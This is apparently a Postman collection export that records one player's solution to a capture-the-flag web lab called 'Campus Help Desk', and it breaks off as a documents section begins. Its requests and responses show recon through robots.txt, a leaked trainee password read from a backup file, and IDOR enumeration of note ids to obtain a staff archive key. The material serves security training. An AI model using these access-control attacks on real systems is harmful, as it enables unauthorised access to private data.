@@ -1,0 +1,1147 @@
+{
+  "info": {
+    "_postman_id": "8decf853-9b75-4b3b-bafd-8a0764d5d079",
+    "name": "Campus Help Desk CTF",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+    "_exporter_id": "42719166"
+  },
+  "item": [
+    {
+      "name": "01 Recon",
+      "item": [
+        {
+          "name": "Home",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}",
+              "host": [
+                "{{baseUrl}}"
+              ]
+            },
+            "description": "No Cookies :0 hungry"
+          },
+          "response": []
+        },
+        {
+          "name": "Notes",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/notes",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "notes"
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "Documents",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/documents",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "documents"
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "Trainee Login",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/login",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "login"
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "sitemap.xml",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/sitemap.xml",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "sitemap.xml"
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "index.html",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/index.ntml",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "index.ntml"
+              ]
+            }
+          },
+          "response": []
+        },
+        {
+          "name": "robots.txt",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/robots.txt",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "robots.txt"
+              ]
+            },
+            "description": "Observation: robots.txt disallows X. Hypothesis: X is accessible anyway."
+          },
+          "response": [
+            {
+              "name": "Disallowed URL",
+              "originalRequest": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{baseUrl}}/robots.txt",
+                  "host": [
+                    "{{baseUrl}}"
+                  ],
+                  "path": [
+                    "robots.txt"
+                  ]
+                }
+              },
+              "status": "OK",
+              "code": 200,
+              "_postman_previewlanguage": "text",
+              "header": [
+                {
+                  "key": "server",
+                  "value": "CampusHelpDesk/3.0"
+                },
+                {
+                  "key": "date",
+                  "value": "Mon, 26 Oct 2026 07:11:53 GMT"
+                },
+                {
+                  "key": "content-type",
+                  "value": "text/plain; charset=utf-8"
+                },
+                {
+                  "key": "content-length",
+                  "value": "46"
+                },
+                {
+                  "key": "cache-control",
+                  "value": "no-store"
+                },
+                {
+                  "key": "x-content-type-options",
+                  "value": "nosniff"
+                },
+                {
+                  "key": "content-security-policy",
+                  "value": "default-src 'self'; style-src 'unsafe-inline'; frame-ancestors 'none'"
+                }
+              ],
+              "cookie": [],
+              "body": "User-agent: *\nDisallow: /backups/helpdesk.txt\n"
+            }
+          ]
+        },
+        {
+          "name": "/backups/helpdesk.txt",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/backups/helpdesk.txt",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "backups",
+                "helpdesk.txt"
+              ]
+            }
+          },
+          "response": [
+            {
+              "name": "leaked trainee login",
+              "originalRequest": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{baseUrl}}/backups/helpdesk.txt",
+                  "host": [
+                    "{{baseUrl}}"
+                  ],
+                  "path": [
+                    "backups",
+                    "helpdesk.txt"
+                  ]
+                }
+              },
+              "status": "OK",
+              "code": 200,
+              "_postman_previewlanguage": "text",
+              "header": [
+                {
+                  "key": "server",
+                  "value": "CampusHelpDesk/3.0"
+                },
+                {
+                  "key": "date",
+                  "value": "Mon, 26 Oct 2026 07:16:13 GMT"
+                },
+                {
+                  "key": "content-type",
+                  "value": "text/plain; charset=utf-8"
+                },
+                {
+                  "key": "content-length",
+                  "value": "289"
+                },
+                {
+                  "key": "cache-control",
+                  "value": "no-store"
+                },
+                {
+                  "key": "x-content-type-options",
+                  "value": "nosniff"
+                },
+                {
+                  "key": "content-security-policy",
+                  "value": "default-src 'self'; style-src 'unsafe-inline'; frame-ancestors 'none'"
+                }
+              ],
+              "cookie": [],
+              "body": "Campus Help Desk: old orientation deployment notes\nThe trainee account was left active while orientation support was tested.\nusername: trainee\npassword: trainee-ba0b1f4a59107c56c5edfc7957e95829\nlogin: /login\nAfter signing in, read the trainee's support note about the locked welcome pack.\n"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "name": "02 Login",
+      "item": [
+        {
+          "name": "Failed Admin Login",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "urlencoded",
+              "urlencoded": [
+                {
+                  "key": "username",
+                  "value": "admin"
+                },
+                {
+                  "key": "password",
+                  "value": "admin"
+                }
+              ]
+            },
+            "url": {
+              "raw": "{{baseUrl}}/login",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "login"
+              ]
+            }
+          },
+          "response": [
+            {
+              "name": "Failed Admin Login",
+              "originalRequest": {
+                "method": "POST",
+                "header": [],
+                "body": {
+                  "mode": "urlencoded",
+                  "urlencoded": [
+                    {
+                      "key": "username",
+                      "value": "admin"
+                    },
+                    {
+                      "key": "password",
+                      "value": "admin"
+                    }
+                  ]
+                },
+                "url": {
+                  "raw": "{{baseUrl}}/login",
+                  "host": [
+                    "{{baseUrl}}"
+                  ],
+                  "path": [
+                    "login"
+                  ]
+                }
+              },
+              "status": "Unauthorized",
+              "code": 401,
+              "_postman_previewlanguage": "html",
+              "header": [
+                {
+                  "key": "server",
+                  "value": "CampusHelpDesk/3.0"
+                },
+                {
+                  "key": "date",
+                  "value": "Mon, 26 Oct 2026 08:26:58 GMT"
+                },
+                {
+                  "key": "content-type",
+                  "value": "text/html; charset=utf-8"
+                },
+                {
+                  "key": "content-length",
+                  "value": "3543"
+                },
+                {
+                  "key": "cache-control",
+                  "value": "no-store"
+                },
+                {
+                  "key": "x-content-type-options",
+                  "value": "nosniff"
+                },
+                {
+                  "key": "content-security-policy",
+                  "value": "default-src 'self'; style-src 'unsafe-inline'; frame-ancestors 'none'"
+                }
+              ],
+              "cookie": [],
+              "body": "<!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"><title>Trainee login | Campus Help Desk</title><style>\n:root{--ink:#19354b;--blue:#1758a6;--sky:#f0f7fc;--line:#cfdeea;--gold:#c78215}\n*{box-sizing:border-box}body{margin:0;color:var(--ink);background:var(--sky);font-family:'Avenir Next','Segoe UI',sans-serif;line-height:1.65}\nheader{background:#133a64;color:white;padding:20px max(24px,calc((100vw - 960px)/2));display:flex;gap:28px;align-items:center;flex-wrap:wrap}\nheader a{color:white;text-decoration:none}header .brand{font-weight:750;font-size:1.2rem;margin-right:auto}nav{display:flex;gap:22px;flex-wrap:wrap}\n.shell{max-width:960px;margin:38px auto;padding:0 24px}.shell.onboarding{max-width:720px}.account{margin-left:auto;font-size:.88rem}\nmain{background:white;padding:34px 42px;border-top:6px solid var(--blue)}h1{font-size:clamp(1.7rem,4vw,2.65rem);line-height:1.18;letter-spacing:-.025em;margin:0 0 22px}h2{font-size:1.35rem;margin-top:32px}h3{font-size:1.05rem}\np,li{max-width:72ch}a{color:var(--blue)}a:hover{text-decoration-thickness:2px}a:focus-visible,button:focus-visible,input:focus-visible,summary:focus-visible{outline:3px solid var(--gold);outline-offset:3px}\n.intro{font-size:1.12rem}.notice{background:#fff7df;border-left:4px solid var(--gold);padding:10px 16px}.service{padding:18px 0;border-bottom:1px solid var(--line)}.service:last-child{border:0}.service h2{margin:0 0 4px}.service p{margin:4px 0}\ncode,pre{font-family:'SFMono-Regular',Consolas,monospace;font-size:.89em}code{background:#edf3f8;padding:2px 5px;overflow-wrap:anywhere}pre{background:#edf3f8;padding:16px;overflow:auto;white-space:pre-wrap;overflow-wrap:anywhere}\nlabel{display:block;margin:16px 0 6px;font-weight:600}input{width:100%;max-width:420px;font:inherit;padding:9px 12px;border:1px solid #8fa8bc;border-radius:3px}button,.button{display:inline-block;background:var(--blue);color:white;border:0;border-radius:3px;font:inherit;font-weight:600;padding:10px 18px;margin-top:12px;cursor:pointer;text-decoration:none}\ndetails{border:1px solid var(--line);margin:10px 0;padding:10px 14px}summary{cursor:pointer;font-weight:600}small{color:#4c657b}footer{max-width:960px;margin:24px auto;padding:0 24px 24px;font-size:.85rem}footer a{margin-right:18px}ul,ol{padding-left:22px}li{margin:10px 0}.flag{padding:16px;background:#edf3f8;overflow-wrap:anywhere}\n.identity{font-size:.9rem;color:#4c657b;margin:0 0 18px}.actions{display:flex;align-items:center;gap:24px;flex-wrap:wrap}.scope{font-size:.9rem;color:#4c657b;margin-top:20px}\n@media(max-width:760px){.shell{margin-top:24px}main{padding:24px}header{padding:16px 24px}.account{margin-left:0}nav{gap:16px}}\n</style></head>\n<body><header><a class=\"brand\" href=\"/helpdesk\">Campus Help Desk</a><nav aria-label=\"Main navigation\"><a href=\"/notes\">My notes</a><a href=\"/login\">Trainee login</a><a href=\"/documents\">Documents</a></nav><span class=\"account\">Installation: 47c98140fc84</span></header><div class=\"shell\"><main><h1>Trainee login</h1><p role=\"status\">Username or password was not accepted.</p>\n<form method=\"post\" action=\"/login\"><label for=\"username\">Username</label><input id=\"username\" name=\"username\" autocomplete=\"off\" required><label for=\"password\">Password</label><input id=\"password\" name=\"password\" type=\"password\" autocomplete=\"off\" required><br><button type=\"submit\">Sign in</button></form></main></div><footer><a href=\"/guide\">Lab guide</a><a href=\"/hints\">Optional hints</a></footer></body></html>"
+            }
+          ]
+        },
+        {
+          "name": "Successful trainee login",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "urlencoded",
+              "urlencoded": [
+                {
+                  "key": "username",
+                  "value": "trainee"
+                },
+                {
+                  "key": "password",
+                  "value": "trainee-ba0b1f4a59107c56c5edfc7957e95829"
+                }
+              ]
+            },
+            "url": {
+              "raw": "{{baseUrl}}/login",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "login"
+              ]
+            },
+            "description": "Login Cookies Yum!"
+          },
+          "response": [
+            {
+              "name": "Successful trainee login",
+              "originalRequest": {
+                "method": "POST",
+                "header": [],
+                "body": {
+                  "mode": "urlencoded",
+                  "urlencoded": [
+                    {
+                      "key": "username",
+                      "value": "trainee"
+                    },
+                    {
+                      "key": "password",
+                      "value": "trainee-ba0b1f4a59107c56c5edfc7957e95829"
+                    }
+                  ]
+                },
+                "url": {
+                  "raw": "{{baseUrl}}/login",
+                  "host": [
+                    "{{baseUrl}}"
+                  ],
+                  "path": [
+                    "login"
+                  ]
+                }
+              },
+              "status": "OK",
+              "code": 200,
+              "_postman_previewlanguage": "html",
+              "header": [
+                {
+                  "key": "server",
+                  "value": "CampusHelpDesk/3.0"
+                },
+                {
+                  "key": "date",
+                  "value": "Mon, 26 Oct 2026 08:28:42 GMT"
+                },
+                {
+                  "key": "content-type",
+                  "value": "text/html; charset=utf-8"
+                },
+                {
+                  "key": "content-length",
+                  "value": "3321"
+                },
+                {
+                  "key": "cache-control",
+                  "value": "no-store"
+                },
+                {
+                  "key": "x-content-type-options",
+                  "value": "nosniff"
+                },
+                {
+                  "key": "content-security-policy",
+                  "value": "default-src 'self'; style-src 'unsafe-inline'; frame-ancestors 'none'"
+                }
+              ],
+              "cookie": [],
+              "body": "<!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"><title>My notes | Campus Help Desk</title><style>\n:root{--ink:#19354b;--blue:#1758a6;--sky:#f0f7fc;--line:#cfdeea;--gold:#c78215}\n*{box-sizing:border-box}body{margin:0;color:var(--ink);background:var(--sky);font-family:'Avenir Next','Segoe UI',sans-serif;line-height:1.65}\nheader{background:#133a64;color:white;padding:20px max(24px,calc((100vw - 960px)/2));display:flex;gap:28px;align-items:center;flex-wrap:wrap}\nheader a{color:white;text-decoration:none}header .brand{font-weight:750;font-size:1.2rem;margin-right:auto}nav{display:flex;gap:22px;flex-wrap:wrap}\n.shell{max-width:960px;margin:38px auto;padding:0 24px}.shell.onboarding{max-width:720px}.account{margin-left:auto;font-size:.88rem}\nmain{background:white;padding:34px 42px;border-top:6px solid var(--blue)}h1{font-size:clamp(1.7rem,4vw,2.65rem);line-height:1.18;letter-spacing:-.025em;margin:0 0 22px}h2{font-size:1.35rem;margin-top:32px}h3{font-size:1.05rem}\np,li{max-width:72ch}a{color:var(--blue)}a:hover{text-decoration-thickness:2px}a:focus-visible,button:focus-visible,input:focus-visible,summary:focus-visible{outline:3px solid var(--gold);outline-offset:3px}\n.intro{font-size:1.12rem}.notice{background:#fff7df;border-left:4px solid var(--gold);padding:10px 16px}.service{padding:18px 0;border-bottom:1px solid var(--line)}.service:last-child{border:0}.service h2{margin:0 0 4px}.service p{margin:4px 0}\ncode,pre{font-family:'SFMono-Regular',Consolas,monospace;font-size:.89em}code{background:#edf3f8;padding:2px 5px;overflow-wrap:anywhere}pre{background:#edf3f8;padding:16px;overflow:auto;white-space:pre-wrap;overflow-wrap:anywhere}\nlabel{display:block;margin:16px 0 6px;font-weight:600}input{width:100%;max-width:420px;font:inherit;padding:9px 12px;border:1px solid #8fa8bc;border-radius:3px}button,.button{display:inline-block;background:var(--blue);color:white;border:0;border-radius:3px;font:inherit;font-weight:600;padding:10px 18px;margin-top:12px;cursor:pointer;text-decoration:none}\ndetails{border:1px solid var(--line);margin:10px 0;padding:10px 14px}summary{cursor:pointer;font-weight:600}small{color:#4c657b}footer{max-width:960px;margin:24px auto;padding:0 24px 24px;font-size:.85rem}footer a{margin-right:18px}ul,ol{padding-left:22px}li{margin:10px 0}.flag{padding:16px;background:#edf3f8;overflow-wrap:anywhere}\n.identity{font-size:.9rem;color:#4c657b;margin:0 0 18px}.actions{display:flex;align-items:center;gap:24px;flex-wrap:wrap}.scope{font-size:.9rem;color:#4c657b;margin-top:20px}\n@media(max-width:760px){.shell{margin-top:24px}main{padding:24px}header{padding:16px 24px}.account{margin-left:0}nav{gap:16px}}\n</style></head>\n<body><header><a class=\"brand\" href=\"/helpdesk\">Campus Help Desk</a><nav aria-label=\"Main navigation\"><a href=\"/notes\">My notes</a><a href=\"/login\">Trainee login</a><a href=\"/documents\">Documents</a></nav><span class=\"account\">Installation: 47c98140fc84</span></header><div class=\"shell\"><main><h1>My notes</h1><p>Signed in as trainee. Your support notes are private.</p><h2>ORI-2042: locked welcome pack</h2><a class=\"button\" href=\"/api/notes?id=1\">Read my note</a></main></div><footer><a href=\"/guide\">Lab guide</a><a href=\"/hints\">Optional hints</a></footer></body></html>"
+            }
+          ]
+        },
+        {
+          "name": "/notes",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/notes",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "notes"
+              ]
+            }
+          },
+          "response": [
+            {
+              "name": "button leading to /api/notes?id=1",
+              "originalRequest": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{baseUrl}}/notes",
+                  "host": [
+                    "{{baseUrl}}"
+                  ],
+                  "path": [
+                    "notes"
+                  ]
+                }
+              },
+              "status": "OK",
+              "code": 200,
+              "_postman_previewlanguage": "html",
+              "header": [
+                {
+                  "key": "server",
+                  "value": "CampusHelpDesk/3.0"
+                },
+                {
+                  "key": "date",
+                  "value": "Mon, 26 Oct 2026 07:30:19 GMT"
+                },
+                {
+                  "key": "content-type",
+                  "value": "text/html; charset=utf-8"
+                },
+                {
+                  "key": "content-length",
+                  "value": "3321"
+                },
+                {
+                  "key": "cache-control",
+                  "value": "no-store"
+                },
+                {
+                  "key": "x-content-type-options",
+                  "value": "nosniff"
+                },
+                {
+                  "key": "content-security-policy",
+                  "value": "default-src 'self'; style-src 'unsafe-inline'; frame-ancestors 'none'"
+                }
+              ],
+              "cookie": [],
+              "body": "<!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"><title>My notes | Campus Help Desk</title><style>\n:root{--ink:#19354b;--blue:#1758a6;--sky:#f0f7fc;--line:#cfdeea;--gold:#c78215}\n*{box-sizing:border-box}body{margin:0;color:var(--ink);background:var(--sky);font-family:'Avenir Next','Segoe UI',sans-serif;line-height:1.65}\nheader{background:#133a64;color:white;padding:20px max(24px,calc((100vw - 960px)/2));display:flex;gap:28px;align-items:center;flex-wrap:wrap}\nheader a{color:white;text-decoration:none}header .brand{font-weight:750;font-size:1.2rem;margin-right:auto}nav{display:flex;gap:22px;flex-wrap:wrap}\n.shell{max-width:960px;margin:38px auto;padding:0 24px}.shell.onboarding{max-width:720px}.account{margin-left:auto;font-size:.88rem}\nmain{background:white;padding:34px 42px;border-top:6px solid var(--blue)}h1{font-size:clamp(1.7rem,4vw,2.65rem);line-height:1.18;letter-spacing:-.025em;margin:0 0 22px}h2{font-size:1.35rem;margin-top:32px}h3{font-size:1.05rem}\np,li{max-width:72ch}a{color:var(--blue)}a:hover{text-decoration-thickness:2px}a:focus-visible,button:focus-visible,input:focus-visible,summary:focus-visible{outline:3px solid var(--gold);outline-offset:3px}\n.intro{font-size:1.12rem}.notice{background:#fff7df;border-left:4px solid var(--gold);padding:10px 16px}.service{padding:18px 0;border-bottom:1px solid var(--line)}.service:last-child{border:0}.service h2{margin:0 0 4px}.service p{margin:4px 0}\ncode,pre{font-family:'SFMono-Regular',Consolas,monospace;font-size:.89em}code{background:#edf3f8;padding:2px 5px;overflow-wrap:anywhere}pre{background:#edf3f8;padding:16px;overflow:auto;white-space:pre-wrap;overflow-wrap:anywhere}\nlabel{display:block;margin:16px 0 6px;font-weight:600}input{width:100%;max-width:420px;font:inherit;padding:9px 12px;border:1px solid #8fa8bc;border-radius:3px}button,.button{display:inline-block;background:var(--blue);color:white;border:0;border-radius:3px;font:inherit;font-weight:600;padding:10px 18px;margin-top:12px;cursor:pointer;text-decoration:none}\ndetails{border:1px solid var(--line);margin:10px 0;padding:10px 14px}summary{cursor:pointer;font-weight:600}small{color:#4c657b}footer{max-width:960px;margin:24px auto;padding:0 24px 24px;font-size:.85rem}footer a{margin-right:18px}ul,ol{padding-left:22px}li{margin:10px 0}.flag{padding:16px;background:#edf3f8;overflow-wrap:anywhere}\n.identity{font-size:.9rem;color:#4c657b;margin:0 0 18px}.actions{display:flex;align-items:center;gap:24px;flex-wrap:wrap}.scope{font-size:.9rem;color:#4c657b;margin-top:20px}\n@media(max-width:760px){.shell{margin-top:24px}main{padding:24px}header{padding:16px 24px}.account{margin-left:0}nav{gap:16px}}\n</style></head>\n<body><header><a class=\"brand\" href=\"/helpdesk\">Campus Help Desk</a><nav aria-label=\"Main navigation\"><a href=\"/notes\">My notes</a><a href=\"/login\">Trainee login</a><a href=\"/documents\">Documents</a></nav><span class=\"account\">Installation: 47c98140fc84</span></header><div class=\"shell\"><main><h1>My notes</h1><p>Signed in as trainee. Your support notes are private.</p><h2>ORI-2042: locked welcome pack</h2><a class=\"button\" href=\"/api/notes?id=1\">Read my note</a></main></div><footer><a href=\"/guide\">Lab guide</a><a href=\"/hints\">Optional hints</a></footer></body></html>"
+            }
+          ]
+        },
+        {
+          "name": "/api/notes?id=1",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/api/notes?id=1",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "api",
+                "notes"
+              ],
+              "query": [
+                {
+                  "key": "id",
+                  "value": "1"
+                }
+              ]
+            }
+          },
+          "response": [
+            {
+              "name": "Ah wells no dice but whats this id= in the url????",
+              "originalRequest": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{baseUrl}}/api/notes?id=1",
+                  "host": [
+                    "{{baseUrl}}"
+                  ],
+                  "path": [
+                    "api",
+                    "notes"
+                  ],
+                  "query": [
+                    {
+                      "key": "id",
+                      "value": "1"
+                    }
+                  ]
+                }
+              },
+              "status": "OK",
+              "code": 200,
+              "_postman_previewlanguage": "json",
+              "header": [
+                {
+                  "key": "server",
+                  "value": "CampusHelpDesk/3.0"
+                },
+                {
+                  "key": "date",
+                  "value": "Mon, 26 Oct 2026 07:31:55 GMT"
+                },
+                {
+                  "key": "content-type",
+                  "value": "application/json; charset=utf-8"
+                },
+                {
+                  "key": "content-length",
+                  "value": "191"
+                },
+                {
+                  "key": "cache-control",
+                  "value": "no-store"
+                },
+                {
+                  "key": "x-content-type-options",
+                  "value": "nosniff"
+                },
+                {
+                  "key": "content-security-policy",
+                  "value": "default-src 'self'; style-src 'unsafe-inline'; frame-ancestors 'none'"
+                }
+              ],
+              "cookie": [],
+              "body": "{\n  \"id\": 1,\n  \"owner\": \"trainee\",\n  \"body\": \"Orientation request ORI-2042: tomorrow's welcome pack is locked. Your trainee note has been escalated. Staff keeps the next entry in the notes system.\"\n}"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "name": "03 Notes / IDOR",
+      "item": [
+        {
+          "name": "id=0 perchance wrong path",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/api/notes?id=0",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "api",
+                "notes"
+              ],
+              "query": [
+                {
+                  "key": "id",
+                  "value": "0"
+                }
+              ]
+            }
+          },
+          "response": [
+            {
+              "name": "id=0 perchance wrong path",
+              "originalRequest": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{baseUrl}}/api/notes?id=0",
+                  "host": [
+                    "{{baseUrl}}"
+                  ],
+                  "path": [
+                    "api",
+                    "notes"
+                  ],
+                  "query": [
+                    {
+                      "key": "id",
+                      "value": "0"
+                    }
+                  ]
+                }
+              },
+              "status": "Not Found",
+              "code": 404,
+              "_postman_previewlanguage": "text",
+              "header": [
+                {
+                  "key": "server",
+                  "value": "CampusHelpDesk/3.0"
+                },
+                {
+                  "key": "date",
+                  "value": "Mon, 26 Oct 2026 08:46:48 GMT"
+                },
+                {
+                  "key": "content-type",
+                  "value": "text/plain; charset=utf-8"
+                },
+                {
+                  "key": "content-length",
+                  "value": "16"
+                },
+                {
+                  "key": "cache-control",
+                  "value": "no-store"
+                },
+                {
+                  "key": "x-content-type-options",
+                  "value": "nosniff"
+                },
+                {
+                  "key": "content-security-policy",
+                  "value": "default-src 'self'; style-src 'unsafe-inline'; frame-ancestors 'none'"
+                }
+              ],
+              "cookie": [],
+              "body": "Note not found.\n"
+            }
+          ]
+        },
+        {
+          "name": "id=2 ohyaaaaa next means +1 not try out 0",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/api/notes?id=2",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "api",
+                "notes"
+              ],
+              "query": [
+                {
+                  "key": "id",
+                  "value": "2"
+                }
+              ]
+            }
+          },
+          "response": [
+            {
+              "name": "Archive key",
+              "originalRequest": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{baseUrl}}/api/notes?id=2",
+                  "host": [
+                    "{{baseUrl}}"
+                  ],
+                  "path": [
+                    "api",
+                    "notes"
+                  ],
+                  "query": [
+                    {
+                      "key": "id",
+                      "value": "2"
+                    }
+                  ]
+                }
+              },
+              "status": "OK",
+              "code": 200,
+              "_postman_previewlanguage": "json",
+              "header": [
+                {
+                  "key": "server",
+                  "value": "CampusHelpDesk/3.0"
+                },
+                {
+                  "key": "date",
+                  "value": "Mon, 26 Oct 2026 07:44:26 GMT"
+                },
+                {
+                  "key": "content-type",
+                  "value": "application/json; charset=utf-8"
+                },
+                {
+                  "key": "content-length",
+                  "value": "318"
+                },
+                {
+                  "key": "cache-control",
+                  "value": "no-store"
+                },
+                {
+                  "key": "x-content-type-options",
+                  "value": "nosniff"
+                },
+                {
+                  "key": "content-security-policy",
+                  "value": "default-src 'self'; style-src 'unsafe-inline'; frame-ancestors 'none'"
+                }
+              ],
+              "cookie": [],
+              "body": "{\n  \"id\": 2,\n  \"owner\": \"staff\",\n  \"body\": \"Staff escalation for ORI-2042. The orientation archive needs the access key below. The recovery document is private; ordinary downloads start in the public directory.\",\n  \"archive_key\": \"92a56d0d30510472028863ad1c510a5b\",\n  \"recovery_file\": \"orientation-recovery-39a5975b500b5e4c.txt\"\n}"
+            }
+          ]
+        },
+        {
+          "name": "Why do i need the archive key again?",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{baseUrl}}/documents",
+              "host": [
+                "{{baseUrl}}"
+              ],
+              "path": [
+                "documents"
+              ]
+            },
+            "description": "I need the archive key to login to documents"
+          },
+          "response": [
+            {
+              "name": "Check out the post request format",
+              "originalRequest": {
+                "method": "GET",
+                "header": [],
+                "url": {
+                  "raw": "{{baseUrl}}/documents",
+                  "host": [
+                    "{{baseUrl}}"
+                  ],
+                  "path": [
+                    "documents"
+                  ]
+                }
+              },
+              "status": "OK",
+              "code": 200,
+              "_postman_previewlanguage": "html",
+              "header": [
+                {
+                  "key": "server",
+                  "value": "CampusHelpDesk/3.0"
+                },
+                {
+                  "key": "date",
+                  "value": "Mon, 26 Oct 2026 07:48:14 GMT"
+                },
+                {
+                  "key": "content-type",
+                  "value": "text/html; charset=utf-8"
+                },
+                {
+                  "key": "content-length",
+                  "value": "3533"
+                },
+                {
+                  "key": "cache-control",
+                  "value": "no-store"
+                },
+                {
+                  "key": "x-content-type-options",
+                  "value": "nosniff"
+                },
+                {
+                  "key": "content-security-policy",
+                  "value": "default-src 'self'; style-src 'unsafe-inline'; frame-ancestors 'none'"
+                }
+              ],
+              "cookie": [],
+              "body": "<!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"><title>Documents | Campus Help Desk</title><style>\n:root{--ink:#19354b;--blue:#1758a6;--sky:#f0f7fc;--line:#cfdeea;--gold:#c78215}\n*{box-sizing:border-box}body{margin:0;color:var(--ink);background:var(--sky);font-family:'Avenir Next','Segoe UI',sans-serif;line-height:1.65}\nheader{background:#133a64;color:white;padding:20px max(24px,calc((100vw - 960px)/2));display:flex;gap:28px;align-items:center;flex-wrap:wrap}\nheader a{color:white;text-decoration:none}header .brand{font-weight:750;font-size:1.2rem;margin-right:auto}nav{display:flex;gap:22px;flex-wrap:wrap}\n.shell{max-width:960px;margin:38px auto;padding:0 24px}.shell.onboarding{max-width:720px}.account{margin-left:auto;font-size:.88rem}\nmain{background:white;padding:34px 42px;border-top:6px solid var(--blue)}h1{font-size:clamp(1.7rem,4vw,2.65rem);line-height:1.18;letter-spacing:-.025em;margin:0 0 22px}h2{font-size:1.35rem;margin-top:32px}h3{font-size:1.05rem}\np,li{max-width:72ch}a{color:var(--blue)}a:hover{text-decoration-thickness:2px}a:focus-visible,button:focus-visible,input:focus-visible,summary:focus-visible{outline:3px solid var(--gold);outline-offset:3px}\n.intro{font-size:1.12rem}.notice{background:#fff7df;border-left:4px solid var(--gold);padding:10px 16px}.service{padding:18px 0;border-bottom:1px solid var(--line)}.service:last-child{border:0}.service h2{margin:0 0 4px}.service p{margin:4px 0}\ncode,pre{font-family:'SFMono-Regular',Consolas,monospace;font-size:.89em}code{background:#edf3f8;padding:2px 5px;overflow-wrap:anywhere}pre{background:#edf3f8;padding:16px;overflow:auto;white-space:pre-wrap;overflow-wrap:anywhere}\nlabel{display:block;margin:16px 0 6px;font-weight:600}input{width:100%;max-width:420px;font:inherit;padding:9px 12px;border:1px solid #8fa8bc;border-radius:3px}button,.button{display:inline-block;background:var(--blue);color:white;border:0;border-radius:3px;font:inherit;font-weight:600;padding:10px 18px;margin-top:12px;cursor:pointer;text-decoration:none}\ndetails{border:1px solid var(--line);margin:10px 0;padding:10px 14px}summary{cursor:pointer;font-weight:600}small{color:#4c657b}footer{max-width:960px;margin:24px auto;padding:0 24px 24px;font-size:.85rem}footer a{margin-right:18px}ul,ol{padding-left:22px}li{margin:10px 0}.flag{padding:16px;background:#edf3f8;overflow-wrap:anywhere}\n.identity{font-size:.9rem;color:#4c657b;margin:0 0 18px}.actions{display:flex;align-items:center;gap:24px;flex-wrap:wrap}.scope{font-size:.9rem;color:#4c657b;margin-top:20px}\n@media(max-width:760px){.shell{margin-top:24px}main{padding:24px}header{padding:16px 24px}.account{margin-left:0}nav{gap:16px}}\n</style></head>\n<body><header><a class=\"brand\" href=\"/helpdesk\">Campus Help Desk</a><nav aria-label=\"Main navigation\"><a href=\"/notes\">My notes</a><a href=\"/login\">Trainee login</a><a href=\"/documents\">Documents</a></nav><span class=\"account\">Installation: 47c98140fc84</span></header><div class=\"shell\"><main><h1>Orientation archive</h1><p>Use the access key recorded in the staff escalation.</p><form method=\"get\" action=\"/download\"><label for=\"key\">Archive access key</label><input id=\"key\" name=\"key\" value=\"\" autocomplete=\"off\" required><label for=\"file\">Document filename</label><input id=\"file\" name=\"file\" value=\"welcome.txt\" required><br><button type=\"submit\">Download</button></form></main></div><footer><a href=\"/guide\">Lab guide</a><a href=\"/hints\">Optional hints</a></footer></body></html>"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "name": "04 Documents",
+      "item": [
+        {
+          "name": "download welcome.txt",
